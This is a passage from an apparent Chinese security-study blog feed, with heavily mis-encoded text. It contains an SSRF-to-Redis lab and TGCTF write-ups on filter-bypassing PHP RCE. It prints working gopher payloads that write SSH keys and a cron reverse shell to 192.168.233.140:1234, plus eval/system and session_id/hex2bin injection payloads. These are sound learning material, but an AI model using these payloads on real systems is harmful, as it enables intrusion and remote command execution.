class="hljs-number">2</span>l35oH79SQ5RYujrC3m4TcjT0OpaIKDyB5HTod2MfyUMIsiOKQIIMuMftfpgXWSn7Q03XZEXe+<span class="hljs-number">0</span>f/EluByC5HGN0rfi4uzOfCKyhsDzElWTW7MDiJ1tSLpvjaeTJihWUwYKMq8n+rw4on2c5Xu6wxa2fu6pXtFY2b+r4kiyPNhb6h00OukEK3ezNx4UZRecQ0vmDRcwBj+<span class="hljs-number">16</span>UbXCs3pGHFpqabraNP04GZZr9+/pPPHUSHKSRlstoc77EmzeKaVg9m5n44LRUAgvkC0aQZak6z+flM8KKuLX58AsBRv73EBKy5goiF2UBYQba9LvFBYz3JjqtrX1GtwwmLM= root@kali%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>asave%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aquit<br></code></pre></td></tr></table></figure><p>åœ¨æ²¡æœ‰å†™å…¥SSHå…¬é’¥å‰ä½¿ç”¨ç§é’¥æµ‹è¯•è¿æ¥</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ssh -<span class="hljs-selector-tag">i</span> id_rsa -<span class="hljs-selector-tag">p</span> <span class="hljs-number">2222</span> root<span class="hljs-keyword">@192</span>.168.233.137<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424164425169.png" alt="image-20250424164425169"></p><p>ä¼šå‘ç°éœ€è¦å…¬é’¥ï¼Œè¿æ¥ä¸ä¸Š</p><p>åœ¨æäº¤payloadåï¼Œå†æ¬¡è¿æ¥ï¼Œå‘ç°ä¸éœ€è¦å…¬é’¥äº†ï¼Œç›´æ¥å¯ä»¥è¿æ¥</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424164844401.png" alt="image-20250424164844401"></p><h3 id="ä½¿ç”¨SSRFå¯¹Redisæœªæˆæƒè®¡åˆ’ä»»åŠ¡Shellåå¼¹"><a href="#ä½¿ç”¨SSRFå¯¹Redisæœªæˆæƒè®¡åˆ’ä»»åŠ¡Shellåå¼¹" class="headerlink" title="ä½¿ç”¨SSRFå¯¹Redisæœªæˆæƒè®¡åˆ’ä»»åŠ¡Shellåå¼¹"></a>ä½¿ç”¨SSRFå¯¹Redisæœªæˆæƒè®¡åˆ’ä»»åŠ¡Shellåå¼¹</h3><ul><li>æƒé™é—®é¢˜ï¼ŒUbuntuå®šæ—¶ä»»åŠ¡éœ€è¦rootæƒé™</li><li>Rediså¤‡ä»½æ–‡ä»¶å­˜åœ¨ä¹±ç ï¼Œåœ¨Ubuntuä¸Šä¼šæŠ¥é”™ï¼Œè€Œåœ¨Centosä¸Šä¸ä¼šæŠ¥é”™</li></ul><p>ä½¿ç”¨SSRFåˆ©ç”¨æ­¤æ¼æ´åˆ‡è®°åœ¨å†™å…¥è®¡åˆ’ä»»åŠ¡å‰åè¦åŠ ä¸Š<code>\n</code>æ¥è¿›è¡Œæ¢è¡Œï¼Œå¦åˆ™æ•°æ®æ±¡æŸ“ä¼šå¯¼è‡´è®¡åˆ’ä»»åŠ¡æ— æ³•æ‰§è¡Œ</p><p>è¦å†™å…¥çš„ç›®å½•æ˜¯<code>/var/spool/cron/</code></p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424171403427.png" alt="image-20250424171403427"></p><p>ä½¿ç”¨å·¥å…·ï¼Œé€‰æ‹©ç¬¬ä¸€ä¸ª</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 gopherus.py --exploit redis<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424165757734.png" alt="image-20250424165757734"></p><p>å¡«å†™ç›®æ ‡çš„IPåœ°å€ï¼ˆæ ¹æ®å®é™…å¡«å†™ï¼‰</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424170000438.png" alt="image-20250424170000438"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">127.0.0.1:6379</span>/_%<span class="hljs-number">2</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">248</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aflushall%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A3%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">241</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2470</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A/<span class="hljs-number">1</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">20</span>bash%<span class="hljs-number">20</span>-c%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>sh%<span class="hljs-number">20</span>-i%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>/dev/tcp/<span class="hljs-number">192.168.233.140</span>/<span class="hljs-number">1234</span>%<span class="hljs-number">200</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">261</span>%<span class="hljs-number">22</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A4%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">246</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aconfig%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Adir%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2416</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A/var/spool/cron/%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A4%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">246</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aconfig%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2410</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Adbfilename%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">244</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aroot%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">244</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Asave%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure><p>ä¼šåå¼¹åˆ°1234ç«¯å£ï¼Œè¦è¿›è¡Œç›‘å¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 1234<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424170153391.png" alt="image-20250424170153391"></p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424170514771.png" alt="image-20250424170514771"></p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424170556802.png" alt="image-20250424170556802"></p>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´ç¬”è®°</category>
      
      <category>SSRF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SSRF å­¦ä¹ ç¬”è®°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ— å‚RCEè§£é¢˜</title>
    <link href="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/"/>
    <url>/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="æ­£å¸¸è§£é¢˜"><a href="#æ­£å¸¸è§£é¢˜" class="headerlink" title="æ­£å¸¸è§£é¢˜"></a>æ­£å¸¸è§£é¢˜</h1><h3 id="TGCTFâ€“å·æ¸¡é˜´å¹³"><a href="#TGCTFâ€“å·æ¸¡é˜´å¹³" class="headerlink" title="TGCTFâ€“å·æ¸¡é˜´å¹³"></a>TGCTFâ€“å·æ¸¡é˜´å¹³</h3><p><strong>è€ƒç‚¹æ€»ç»“ï¼š</strong> PHP session_idã€ç»•è¿‡wafã€æ— å‚RCEï¼ˆéé¢„æœŸï¼‰</p><p>æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$tgctf2025</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tgctf2025&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$tgctf2025</span>))&#123;<br>    <span class="hljs-comment">//hintï¼šä½ å¯ä»¥å¯¹ç€é”®ç›˜ä¸€ä¸ªä¸€ä¸ªçœ‹ï¼Œç„¶ååœ¨æ²¡è¿‡æ»¤çš„ç¬¦å·ä¸Šç”¨è®°å·ç¬”ç”»ä¸€ä¸‹ï¼ˆbushi</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$tgctf2025</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;(â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢*ï½â—&#x27;</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>éé¢„æœŸæ‰“æ— å‚RCE</p><p><strong>æ–¹æ³•ä¸€ï¼š</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?tgctf2025=eval(<span class="hljs-keyword">end</span>(<span class="hljs-keyword">current</span>(get_defined_vars())));&amp;b=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><ul><li><code>get_defined_vars()</code>è·å–å·²ç»å®šä¹‰çš„æ‰€æœ‰å˜é‡å¹¶è¿”å›ä¸€ä¸ªæ•°ç»„</li><li><code>current()</code>æ¥æ”¶å‰é¢çš„å‡½æ•°è¿”å›çš„æ•°ç»„å¹¶è¿”å›æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ </li><li><code>end()</code>å°†ä¼šç§»åŠ¨æ•°ç»„å†…éƒ¨æŒ‡é’ˆåˆ°æœ€åä¸€ä¸ªæ•°ç»„å…ƒç´ å¹¶è¿”å›è¿™ä¸ªå€¼</li><li><code>eval</code>å°†ä¼šæ‰§è¡Œè¿”å›çš„å€¼ï¼Œç„¶åå¼•ç”¨èµ‹å€¼ï¼ˆå°±æ˜¯&amp;ç¬¦å·ï¼‰ï¼Œå°†åè¾¹å‘½ä»¤çš„ç»“æœèµ‹å€¼ç»™bï¼Œè¿™ä¸ªbå°±æ˜¯æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œæœ€ç»ˆä¼šè¢«evalæ‰§è¡Œå¹¶ä¸”è¾“å‡ºç»“æœ</li></ul><p><strong>æ–¹æ³•äºŒ</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?tgctf2025=var_dump(scandir(<span class="hljs-built_in">dirname</span>(<span class="hljs-built_in">dirname</span>(<span class="hljs-built_in">dirname</span>(getcwd())))));<br></code></pre></td></tr></table></figure><ul><li><code>getcwd()</code>ï¼šè¿”å›å½“å‰å·¥ä½œç›®å½•çš„ç»å¯¹è·¯å¾„</li><li><code>dirname()</code>ï¼šè¿™ä¸ªå‡½æ•°ä¼šè¿”å›æŒ‡å®šè·¯å¾„çš„çˆ¶ç›®å½•ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡½æ•°è¿›è¡Œç›®å½•ç©¿è¶Šåˆ°æ ¹ç›®å½•</li><li><code>scandir()</code>ï¼šè¿™ä¸ªå‡½æ•°ä¼šå°†æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•çš„åç§°ä½œä¸ºä¸€ä¸ªæ•°ç»„è¿”å›ï¼Œè¿™é‡Œè¿”å›çš„æ˜¯æ ¹ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•</li><li><code>var_dump()</code>ï¼šå°†è¿”å›çš„å«æœ‰æ ¹ç›®å½•çš„æ–‡ä»¶å’Œå­ç›®å½•åçš„æ•°ç»„æ‰“å°å‡ºæ¥</li></ul><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/image-20250415002022637.png" alt="image-20250415002022637"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?tgctf2025=highlight_file(array_rand(array_flip(scandir(<span class="hljs-built_in">dirname</span>(<span class="hljs-built_in">chdir</span>(<span class="hljs-built_in">dirname</span>(<span class="hljs-built_in">dirname</span>(<span class="hljs-built_in">dirname</span>(getcwd())))))))));<br></code></pre></td></tr></table></figure><ul><li><code>dirname(dirname(dirname(getcwd())))</code>ï¼šç©¿è¶Šåˆ°æ ¹ç›®å½•ï¼Œå¹¶è¿”å›æ ¹ç›®å½•</li><li><code>chdir()</code>ï¼šè¿™ä¸ªå‡½æ•°ä¼šæ”¹å˜å½“å‰çš„å·¥ä½œç›®å½•åˆ°æŒ‡å®šç›®å½•ï¼Œè¿™é‡Œå°†å·¥ä½œç›®å½•æ”¹å˜ä¸ºæ ¹ç›®å½•ï¼Œå¹¶è¿”å›å¸ƒå°”å€¼ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸€æ­¥ä¼šå‘ç°ä¸èƒ½è¯»å–æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œåªä¼šæŠ¥é”™</li><li><code>dirname()</code>ï¼šå› ä¸ºä¸Šé¢çš„å‡½æ•°çš„è¿”å›å€¼æ˜¯å¸ƒå°”ç±»å‹ï¼Œä½†åé¢çš„å‡½æ•°æ¥æ”¶çš„ç±»å‹è¦æ˜¯æŒ‡å®šçš„ç›®å½•ï¼Œæ‰€ä»¥è¿™é‡Œè¦åŠ ä¸€ä¸ªè¿™ä¸ªå‡½æ•°ï¼Œå°†è¿”å›å€¼æ”¹æˆæ ¹ç›®å½•</li><li><code>scandir()</code>ï¼šè¿™ä¸ªå‡½æ•°ä¼šå°†æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•çš„åç§°ä½œä¸ºä¸€ä¸ªæ•°ç»„è¿”å›ï¼Œè¿™é‡Œè¿”å›çš„æ˜¯æ ¹ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•</li><li><code>array_flip()</code> ï¼šè¿™ä¸ªå‡½æ•°ç”¨äºäº¤æ¢æ•°ç»„ä¸­é”®å’Œå€¼çš„ä½ç½®ï¼Œè‹¥ <code>scandir()</code> è¿”å›çš„æ•°ç»„æ˜¯ <code>[&#39;.&#39;, &#39;..&#39;, &#39;file1.txt&#39;, &#39;file2.php&#39;]</code>ï¼Œç»è¿‡ <code>array_flip()</code> å¤„ç†åï¼Œä¼šå˜æˆ <code>[&#39;.&#39; =&gt; 0, &#39;..&#39; =&gt; 1, &#39;file1.txt&#39; =&gt; 2, &#39;file2.php&#39; =&gt; 3]</code></li><li><code>array_rand()</code> ï¼šè¿™ä¸ªå‡½æ•°ç”¨äºä»æ•°ç»„ä¸­éšæœºé€‰å–ä¸€ä¸ªæˆ–å¤šä¸ªé”®ï¼Œè¿™é‡Œå°±ä¼šéšæœºé€‰ä¸€ä¸ªæ–‡ä»¶</li><li><code>highlight_file()</code> ï¼šè¿™ä¸ªå‡½æ•°å°†éšæœºé€‰å–çš„æ–‡ä»¶å†…å®¹é«˜äº®æ˜¾ç¤ºå‡ºæ¥</li></ul><p>ç¼ºå°‘<code>scandir()</code>å‡½æ•°æ›´æ”¹å·¥ä½œç›®å½•è¿™ä¸€æ­¥çš„ç»“æœæ˜¯æ— æ³•è¯»å–æ–‡ä»¶</p><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/image-20250415005040694.png" alt="image-20250415005040694"></p><p>åŠ ä¸Šè¿™ä¸ªå‡½æ•°å°±å¯ä»¥è¯»æ–‡ä»¶äº†ï¼Œå› ä¸ºæ˜¯éšæœºé€‰å–ä¸€ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥åˆ·æ–°å‡ æ¬¡å°±å¯ä»¥è¯»åˆ°äº†</p><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/image-20250415004819352.png" alt="image-20250415004819352"></p><p><strong>æ–¹æ³•ä¸‰</strong>ï¼š</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">?tgctf2025=show_source(<span class="hljs-built_in">array</span>_rand(<span class="hljs-built_in">array</span>_flip(scandir(dirname(chdir(strrev(crypt(serialize(<span class="hljs-built_in">array</span>())))))))));<br></code></pre></td></tr></table></figure><ul><li><code>array()</code>ï¼šåˆ›å»ºä¸€ä¸ªç©ºæ•°ç»„</li><li><code>serialize()</code>ï¼šå°†åˆ›å»ºçš„ç©ºæ•°ç»„åºåˆ—åŒ–æˆå­—ç¬¦ä¸²ï¼Œç»“æœæ˜¯<code>a:0:&#123;&#125;</code></li><li><code>crypt()</code>ï¼šå¯¹åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²è¿›è¡ŒåŠ å¯†ï¼Œæœ€åå¾—åˆ°çš„ç»“æœæ˜¯éšæœºçš„ï¼Œå¦‚<code>$1$pc4jiIfD$pqtTfFXRHonNcpqbxqhtK.</code>ï¼Œè¿™é‡Œå°±æ˜¯éœ€è¦éšæœºå‡ºæœ€åä¸€ä¸ªå­—ç¬¦æ˜¯ç‚¹<code>.</code></li><li><code>strrev()</code>ï¼šæŠŠåŠ å¯†åçš„å­—ç¬¦ä¸²è¿›è¡Œåè½¬ï¼Œå°†ç‚¹<code>.</code>æ”¾åˆ°å­—ç¬¦ä¸²çš„å¼€å¤´</li><li><code>ord()</code> å‡½æ•°è¿”å›å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ASCII å€¼</li><li><code>chr()</code> å‡½æ•°æ ¹æ® ASCII å€¼è¿”å›å¯¹åº”çš„å­—ç¬¦</li><li><code>chdir()</code>ï¼šè¿™ä¸ªå‡½æ•°ä¼šæ”¹å˜å½“å‰çš„å·¥ä½œç›®å½•åˆ°æŒ‡å®šç›®å½•ï¼Œè¿™é‡Œå°†å·¥ä½œç›®å½•æ”¹å˜ä¸ºæ ¹ç›®å½•ï¼Œå¹¶è¿”å›å¸ƒå°”å€¼ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸€æ­¥ä¼šå‘ç°ä¸èƒ½è¯»å–æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œåªä¼šæŠ¥é”™</li><li><code>dirname()</code>ï¼šå› ä¸ºä¸Šé¢çš„å‡½æ•°çš„è¿”å›å€¼æ˜¯å¸ƒå°”ç±»å‹ï¼Œä½†åé¢çš„å‡½æ•°æ¥æ”¶çš„ç±»å‹è¦æ˜¯æŒ‡å®šçš„ç›®å½•ï¼Œæ‰€ä»¥è¿™é‡Œè¦åŠ ä¸€ä¸ªè¿™ä¸ªå‡½æ•°ï¼Œå°†è¿”å›å€¼æ”¹æˆæ ¹ç›®å½•</li><li><code>scandir()</code>ï¼šè¿™ä¸ªå‡½æ•°ä¼šå°†æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•çš„åç§°ä½œä¸ºä¸€ä¸ªæ•°ç»„è¿”å›ï¼Œè¿™é‡Œè¿”å›çš„æ˜¯æ ¹ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•</li><li><code>array_flip()</code> ï¼šè¿™ä¸ªå‡½æ•°ç”¨äºäº¤æ¢æ•°ç»„ä¸­é”®å’Œå€¼çš„ä½ç½®</li><li><code>array_rand()</code> ï¼šè¿™ä¸ªå‡½æ•°ç”¨äºä»æ•°ç»„ä¸­éšæœºé€‰å–ä¸€ä¸ªæˆ–å¤šä¸ªé”®ï¼Œè¿™é‡Œå°±ä¼šéšæœºé€‰ä¸€ä¸ªæ–‡ä»¶</li><li><code>show_source()</code>ï¼šè¿™ä¸ªå‡½æ•°å°†éšæœºé€‰å–çš„æ–‡ä»¶å†…å®¹é«˜äº®æ˜¾ç¤ºå‡ºæ¥</li></ul><h1 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h1><h2 id="hex2binï¼ˆï¼‰"><a href="#hex2binï¼ˆï¼‰" class="headerlink" title="hex2binï¼ˆï¼‰"></a>hex2binï¼ˆï¼‰</h2><h3 id="TGCTFâ€“å·æ¸¡é˜´å¹³ï¼ˆå¤ä»‡ï¼‰"><a href="#TGCTFâ€“å·æ¸¡é˜´å¹³ï¼ˆå¤ä»‡ï¼‰" class="headerlink" title="TGCTFâ€“å·æ¸¡é˜´å¹³ï¼ˆå¤ä»‡ï¼‰"></a>TGCTFâ€“å·æ¸¡é˜´å¹³ï¼ˆå¤ä»‡ï¼‰</h3><p>**è€ƒç‚¹æ€»ç»“ï¼š**PHPã€session_idã€ç»•è¿‡wafã€RCE</p><p>è¿™ä¸ªæŠŠæ— å‚RCEç»™banäº†ï¼Œé¿å…éé¢„æœŸ</p><p>æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$tgctf2025</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tgctf2025&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i&quot;</span>, <span class="hljs-variable">$tgctf2025</span>))&#123;<br>    <span class="hljs-comment">//hintï¼šä½ å¯ä»¥å¯¹ç€é”®ç›˜ä¸€ä¸ªä¸€ä¸ªçœ‹ï¼Œç„¶ååœ¨æ²¡è¿‡æ»¤çš„ç¬¦å·ä¸Šç”¨è®°å·ç¬”ç”»ä¸€ä¸‹ï¼ˆbushi</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$tgctf2025</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;(â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢*ï½â—&#x27;</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?tgctf2025=<span class="hljs-title function_ invoke__">session_start</span>();<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">session_id</span>()));<br><span class="hljs-comment">// cookieä¸­æ„é€ cat /flagçš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²</span><br>PHPSESSID=<span class="hljs-number">636174202</span>f666c6167<br></code></pre></td></tr></table></figure><ul><li><p><code>session_start()</code> ï¼šåœ¨ PHPä¸­ è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯å¼€å¯ä¸€ä¸ªæ–°ä¼šè¯æˆ–è€…å¤ç”¨å·²æœ‰çš„ä¼šè¯</p></li><li><p><code>session_id()</code> ï¼šè¿™ä¸ªå‡½æ•°ç”¨äºè·å–å½“å‰ä¼šè¯çš„ IDï¼Œå³<code>cookie</code>ä¸­çš„<code>PHPSESSID</code></p></li><li><p><code>hex2bin()</code>ï¼šè¿™ä¸ªå‡½æ•°ä¼šå°†<code>PHPSESSID</code>çš„ åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬åŒ–ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</p></li><li><p><code>system()</code>ï¼šä¼šæ‰§è¡Œè½¬åŒ–åçš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²å‘½ä»¤</p></li></ul><p>è¿™é¢˜çš„è§£é¢˜æ€è·¯å°±æ˜¯å¼€å¯ä¸€ä¸ªæ–°ä¼šè¯ï¼Œé€šè¿‡åœ¨å½“å‰ä¼šè¯çš„ ID ä¸­æ„é€ è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œå¹¶è½¬åŒ–ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œä½¿ç”¨<code>system()</code>å‡½æ•°æ‰§è¡Œå‘½ä»¤</p><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/image-20250415124542664.png" alt="image-20250415124542664"></p><h2 id="è¯»æ–‡ä»¶"><a href="#è¯»æ–‡ä»¶" class="headerlink" title="è¯»æ–‡ä»¶"></a>è¯»æ–‡ä»¶</h2><p>å¦‚æœçŸ¥é“æ–‡ä»¶åï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨readfileè¯»æ–‡ä»¶ï¼Œåœ¨ PHPSESSION ä¸­å†™å…¥æ–‡ä»¶å</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">readfile</span></span>(<span class="hljs-title">session_id</span>(<span class="hljs-title">session_start</span>()));</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/image-20250416162541034.png" alt="image-20250416162541034"></p><h1 id="getallheaders"><a href="#getallheaders" class="headerlink" 